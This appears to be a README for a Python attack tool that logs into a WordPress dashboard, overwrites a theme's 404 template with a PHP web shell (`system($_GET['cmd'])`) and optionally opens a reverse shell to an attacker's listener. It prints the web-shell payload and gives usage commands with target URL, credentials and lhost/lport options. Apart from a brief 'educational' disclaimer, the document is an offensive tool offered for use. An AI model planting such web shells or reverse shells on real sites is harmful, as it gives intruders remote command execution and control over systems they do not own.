# WP-editor-shell
Python script to automaticly get a reverse shell from WP theme editor page 

## Description
This script was created to simplify the creation of a reverse shell from a wordpress dashboard editor page. It allow the user to update the page 404 of a theme and replace the content with `<?php system($_GET["cmd"]);?>` which then allow command execution on the page. 

## Usage 
Usage to upload the PHP payload and gain RCE on the site 
```
python wp-editor-shell.py --url http://127.0.0.1/wordpress -u admin -p admin
```

Usage to get a reverse shell

To be able to get a reverse shell you first need to open a listener on your attack machine. 

```
python wp-editor-shell.py --url http://127.0.0.1/wordpress -u admin -p admin --lhost 172.0.0.1 --lport 80
```

## Help 

```
-h, --help       Display help message

-u, --username   Username to use for wordpress Dasboard

-p, --password   Password to use for wordpress Dasboard

--url            Address of the target website

--lhost          Ip address to use for the reverse shell

--lport          Local port to use for the reverse shell
```
## Disclaimer 

This script was created only for educationnal purpose. 
